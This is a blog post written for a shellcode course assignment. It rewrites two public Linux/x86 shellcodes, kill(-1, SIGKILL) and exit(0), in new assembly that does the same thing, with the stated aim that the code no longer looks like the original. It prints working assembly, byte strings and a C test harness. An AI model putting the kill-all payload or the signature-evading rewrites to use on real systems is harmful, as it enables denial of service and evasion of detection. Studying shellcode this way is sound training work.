---
layout: post
title: " Linux/x86 - Code Polymorphism examples "
date: 2017-05-04 12:00:00
share: true
comments: true
tags: [Exploit Development, Shellcoding, SLAE, OSCE Prep]
---

_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)._
_**Student ID:** SLAE-885_
_**Assignment number:** 6.2 and 6.3_
_**Github repo:** <https://github.com/abatchy17/SLAE>_  

---

_In assignment 6, the requirement is polymorphing 3+ shellcodes off shellstorm.org or exploit-db.com_, which basically means modifying the code so it doesn't look like the original yet has the same functionality. This post contains the remaining 2 parts for assignment 3._
  

## Linux/x86 - kill all processes

The following shellcode is written by Kris Katterjohn and can be found [here](http://shell-storm.org/shellcode/files/shellcode-212.php).  

```nasm
section .text  
  
global _start  
  
_start:  
  
    ; kill(-1, SIGKILL)  
  
    push byte 37  
    pop eax  
    push byte -1  
    pop ebx  
    push byte 9  
    pop ecx  
    int 0x80  
```

Very simple code, it sets `EAX` to 37 (syscall for `kill()`), sets `EBX` to -1 (to target all processes) and `ECX` to 9 (`SIGKILL`).  
  
Let's modify this code slightly:  

```nasm
section .text  
  
global _start  
  
_start:  
  
    ; kill(-1, SIGKILL)  
  
    xor ebx, ebx  
    dec ebx  
    push byte 37  
    pop eax  
    push byte 9  
    pop ecx  
    int 0x80  
```

See what I did there? Shellcode is of same size so we're good.  
  

## Linux/x86 - exit(0)

The following shellcode is written by gunslinger_ and can be found [here](http://shell-storm.org/shellcode/files/shellcode-623.php).  

```cpp
/*  
Name   : 8 bytes sys_exit(0) x86 linux shellcode  
Date   : may, 31 2010  
Author : gunslinger_  
Web    : devilzc0de.com  
blog   : gunslinger.devilzc0de.com  
tested on : linux debian  
*/  
  
char *bye=  
 "\x31\xc0"                    /* xor    %eax,%eax */  
 "\xb0\x01"                    /* mov    $0x1,%al */  
 "\x31\xdb"                    /* xor    %ebx,%ebx */  
 "\xcd\x80";                   /* int    $0x80 */  
  
int main(void)  
{  
  ((void (*)(void)) bye)();  
  return 0;  
}  
```    

  
What can we do about this code? Well, `mov al, 0x1` can be replaced with `inc eax`.  

```nasm
global _start  
_start:  
  
xor eax, eax  
inc eax  
xor ebx, ebx  
int 0x80  
```

Shellcode is now one byte smaller, sweet.  
  
\- Abatchy
